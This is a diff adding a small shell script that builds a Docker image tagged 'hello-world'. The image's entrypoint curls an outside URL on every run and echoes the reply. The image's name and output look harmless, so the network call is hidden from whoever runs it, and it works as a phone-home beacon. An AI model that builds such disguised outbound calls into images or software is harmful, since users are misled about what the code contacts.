@@ -1,0 +1,9 @@
+#!/bin/sh
+
+echo "FROM busybox" > dock/Dockerfile
+echo 'ENTRYPOINT sh -c "export A=`curl http://write.revilog.com/test5.php 2>/dev/null`;echo hello-world $A"' >> dock/Dockerfile
+
+#echo "ENTRYPOINT sh -c \"hello-world\"" >> dock/Dockerfile
+
+docker build -t hello-world dock
+
